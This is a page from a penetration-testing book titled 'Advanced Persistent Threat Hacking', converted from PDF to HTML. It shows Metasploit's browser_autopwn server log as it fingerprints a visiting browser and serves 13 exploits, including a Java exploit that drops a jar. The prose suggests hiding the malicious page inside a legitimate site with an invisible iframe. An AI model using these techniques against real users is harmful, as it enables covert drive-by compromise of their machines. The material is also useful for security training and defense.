<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pfdb" class="pf w2 h2" data-page-no="db"><div class="pc pcdb w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">196<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x3 h40 ya7f fff fs5 fc0 sc0 ls0 ws0">[*] --- Done, found 66 exploit modules</div><div class="t m0 x3 h40 ya80 fff fs5 fc0 sc0 ls0 ws0">[*] Using URL: http://0.0.0.0:80/</div><div class="t m0 x3 h40 ya81 fff fs5 fc0 sc0 ls0 ws0">[*]  Local IP: http://192.168.1.25:80/</div><div class="t m0 x3 h40 ya82 fff fs5 fc0 sc0 ls0 ws0">[*] Server started.</div><div class="t m0 x4 hd y14da ff4 fs7 fc0 sc0 ls0 ws0">W<span class="_ _3"/>e’<span class="_ _0"/>ve congured the serv<span class="_ _0"/>er to listen on port 80, rather than the default 8080. <span class="_ _0"/>The </div><div class="t m0 x3 hd y14db ff4 fs7 fc0 sc0 ls0 ws0">URIP<span class="_ _3"/>A<span class="_ _3"/>TH option will dene the resource after the server name that will house the </div><div class="t m0 x3 hd y14dc ff4 fs7 fc0 sc0 ls0 ws0">exploit. <span class="_ _0"/>Thus, if we set the URIP<span class="_ _3"/>A<span class="_ _1b"/>TH option to “login,<span class="_ _0"/>” then a user w<span class="_ _0"/>ould hav<span class="_ _0"/>e to be </div><div class="t m0 x3 hd y14dd ff4 fs7 fc0 sc0 ls0 ws0">directed to the URL of http://192.168.1.25/login/ to ex<span class="_ _0"/>ecute the attack. <span class="_ _3"/>Y<span class="_ _3"/>ou can see </div><div class="t m0 x3 hd y14de ff4 fs7 fc0 sc0 lsb ws16">that at the end, Metasploit has loaded 66 exploits, which it can attempt to use against </div><div class="t m0 x3 hd y14df ff4 fs7 fc0 sc0 ls0 ws0">any systems that access the dened URL.</div><div class="t m0 x4 hd y14e0 ff4 fs7 fc0 sc0 ls0 ws0">In the follo<span class="_ _0"/>wing example, you see the output from msfconsole when a user </div><div class="t m0 x3 hd y14e1 ff4 fs7 fc0 sc0 ls0 ws0">accesses the URL. <span class="_ _3"/>Y<span class="_ _3"/>ou’ll notice the line with the Ja<span class="_ _0"/>vaScript report, which sends us </div><div class="t m0 x3 hd y14e2 ff4 fs7 fc0 sc0 ls0 ws0">back the specic version and capabilities of the bro<span class="_ _0"/>wser<span class="_ _2"/>. Based on that information, </div><div class="t m0 x3 hd y14e3 ff4 fs7 fc0 sc0 ls0 ws0">Metasploit is sending 13 exploits that the bro<span class="_ _0"/>wser might be vulnerable to. <span class="_ _0"/>This is </div><div class="t m0 x3 hd y14e4 ff4 fs7 fc0 sc0 ls0 ws0">good, as we’<span class="_ _2"/>re not wasting time sending exploits for Internet Explorer if the bro<span class="_ _0"/>wser </div><div class="t m0 x3 hd y14e5 ff4 fs7 fc0 sc0 ls0 ws0">is Safari.</div><div class="t m0 x3 h40 y14e6 fff fs5 fc0 sc0 ls0 ws0">msf auxiliary(browser_autopwn) &gt; </div><div class="t m0 x3 h40 y14e7 fff fs5 fc0 sc0 ls0 ws0">[*] 192.168.1.25     browser_autopwn - Handling '/'</div><div class="t m0 x3 h40 y14e8 fff fs5 fc0 sc0 ls0 ws0">[*] 192.168.1.25     browser_autopwn - Handling '/?sessid=TGludXg6dW5kZWZpbmVk</div><div class="t m0 x3 h40 y14e9 fff fs5 fc0 sc0 ls0 ws0">OnVuZGVmaW5lZDplbi1VUzp4ODY6Q2hyb21lOjI5LjAuMTU0Ny41Nzo%3d'</div><div class="t m0 x3 h40 y14ea fff fs5 fc0 sc0 ls0 ws0">[*] 192.168.1.25     browser_autopwn - JavaScript Report: </div><div class="t m0 x3 h40 y14eb fff fs5 fc0 sc0 ls0 ws0">Linux:undefined:undefined:en-US:x86:Chrome:29.0.1547.57:</div><div class="t m0 x3 h40 y14ec fff fs5 fc0 sc0 ls0 ws0">[*] 192.168.1.25     browser_autopwn - Responding with 13 exploits</div><div class="t m0 x3 h40 y14ed fff fs5 fc0 sc0 ls0 ws0">[*] 192.168.1.25     browser_autopwn - Handling '/favicon.ico'</div><div class="t m0 x3 h40 y14ee fff fs5 fc0 sc0 ls0 ws0">[*] 192.168.1.25     browser_autopwn - 404ing /favicon.ico</div><div class="t m0 x3 h40 y14ef fff fs5 fc0 sc0 ls0 ws0">[*] 192.168.1.25     java_atomicreferencearray - Sending Java </div><div class="t m0 x3 h40 y14f0 fff fs5 fc0 sc0 ls0 ws0">AtomicReferenceArray Type Violation Vulnerability</div><div class="t m0 x3 h40 y14f1 fff fs5 fc0 sc0 ls0 ws0">[*] 192.168.1.25     java_atomicreferencearray - Generated jar to drop (5487 </div><div class="t m0 x3 h40 y14f2 fff fs5 fc0 sc0 ls0 ws0">bytes).</div><div class="t m0 x3 h40 y14f3 fff fs5 fc0 sc0 ls0 ws0">[*] 192.168.1.25     java_jre17_driver_manager - handling request for /ZVJpKUR</div><div class="t m0 x3 h40 y14f4 fff fs5 fc0 sc0 ls0 ws0">[*] 192.168.1.25     java_jre17_driver_manager - handling request for /</div><div class="t m0 x3 h40 y14f5 fff fs5 fc0 sc0 ls0 ws0">ZVJpKUR/</div><div class="t m0 x4 hd y14f6 ff4 fs7 fc0 sc0 ls0 ws0">This is denitely one of the exploits you should demo in a lab to see what the user </div><div class="t m0 x3 hd y14f7 ff4 fs7 fc0 sc0 ls0 ws0">will experience when the<span class="_ _0"/>y vie<span class="_ _0"/>w the site. The default of what the<span class="_ _0"/>y will see is sho<span class="_ _0"/>wn </div><div class="t m0 x3 hd y14f8 ff4 fs7 fc0 sc0 ls0 ws0">in Figure 6-2: a blank white page and a prompt to run a Jav<span class="_ _0"/>a app. <span class="_ _0"/>The only other </div><div class="t m0 x3 hd y14f9 ff4 fs7 fc0 sc0 ls0 ws0">thing the user might notice is that their bro<span class="_ _0"/>wser will be refreshing many times while </div><div class="t m0 x3 hd y14fa ff4 fs7 fc0 sc0 ls0 ws0">cycling through the e<span class="_ _0"/>xploits. If the user vie<span class="_ _0"/>ws the page source, all they’ll see is a big </div><div class="t m0 x3 hd y14fb ff4 fs7 fc0 sc0 ls0 ws0">mess of (mostly obfuscated) Jav<span class="_ _0"/>aScript code.</div><div class="t m0 x4 hd y14fc ff4 fs7 fc0 sc0 ls0 ws0">Because a simple white page might make the user suspicious, we can include the </div><div class="t m0 x3 hd y14fd ff4 fs7 fc0 sc0 ls0 ws0">bro<span class="_ _0"/>wser_autopwn web page within another legitimate web page using an iframe. In </div><div class="t m0 x3 hd y14fe ff4 fs7 fc0 sc0 ls0 ws0">the follo<span class="_ _0"/>wing example, we use an iframe that will be hidden because the height and </div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>